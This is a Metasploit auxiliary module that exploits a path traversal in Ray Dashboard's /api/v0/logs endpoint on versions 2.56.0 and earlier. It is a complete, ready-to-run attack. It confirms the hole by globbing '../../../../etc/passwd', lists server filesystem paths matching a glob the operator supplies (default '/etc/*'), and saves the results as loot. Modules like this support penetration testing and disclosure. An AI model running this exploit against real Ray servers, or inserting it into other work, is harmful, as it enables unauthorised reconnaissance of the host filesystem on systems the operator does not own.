##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ray Dashboard Logs API Path Traversal',
        'Description' => %q{
          Ray Dashboard versions 2.56.0 and earlier are vulnerable to path traversal
          through the /api/v0/logs endpoint, allowing unauthenticated attackers to enumerate
          and read filesystem paths via attacker-controlled glob paths.
        },
        'Author' => ['Richard Howe <rhowe425>'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/ray-project/ray/pull/64701']
        ],
        'DisclosureDate' => '2026-07-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8265),
        OptString.new(
          'TARGETURI',
          [ true, 'Base path of the Ray Dashboard', '/' ]
        ),
        OptString.new(
          'FILE_PATH',
          [ true, 'Filesystem glob path to enumerate', '/etc/*' ]
        ),
        OptString.new(
          'NODE_ID',
          [ true, 'Unique ID for a Ray node' ]
        )
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/version')
    })

    return Exploit::CheckCode::Unknown(
      'No response or unexpected status from Ray API'
    ) unless res && res.code == 200

    ray_version = res.get_json_document['ray_version']

    return Exploit::CheckCode::Unknown(
      'Could not determine Ray version'
    ) unless ray_version

    return Exploit::CheckCode::Safe(
      "Ray version #{ray_version} is not vulnerable"
    ) unless Rex::Version.new(ray_version) <= Rex::Version.new('2.56.0')

    entries = enumerate_files('../../../../etc/passwd')

    if entries && entries.any? { |entry| entry.include?('/etc/passwd') }
      return Exploit::CheckCode::Vulnerable(
        "Ray #{ray_version} - path traversal via /api/v0/logs confirmed"
      )
    end

    Exploit::CheckCode::Appears(
      "Ray version #{ray_version} is in the vulnerable range"
    )
  end

  def enumerate_files(filepath)
    vars_get = {
      'glob' => filepath,
      'node_id' => datastore['NODE_ID']
    }

    uri = normalize_uri(target_uri.path, 'api/v0/logs')
    query = URI.encode_www_form(vars_get)

    url = "#{ssl ? 'https' : 'http'}://#{rhost}:#{rport}#{uri}?#{query}"
    vprint_status("Request URL: #{url}")

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => uri,
        'vars_get' => vars_get
      }
    )

    return unless res && res.code == 200

    json = res.get_json_document
    entries = json.dig('data', 'result', 'internal')

    return unless entries

    entries.map do |entry|
      entry.sub(%r{\A(\.\./)+}, '/')
    end
  end

  def run
    entries = enumerate_files(datastore['FILE_PATH'])

    fail_with(
      Failure::Unknown,
      'Failed to enumerate filesystem entries'
    ) unless entries

    print_good('Filesystem entries found:')

    entries.each do |entry|
      print_line("  #{entry}")
    end

    loot_path = store_loot(
      'ray.dashboard.files',
      'text/plain',
      rhost,
      entries.join("\n"),
      'ray_dashboard_files.txt',
      'Ray Dashboard filesystem paths retrieved via path traversal'
    )

    print_good("Loot stored in: #{loot_path}")
  end
end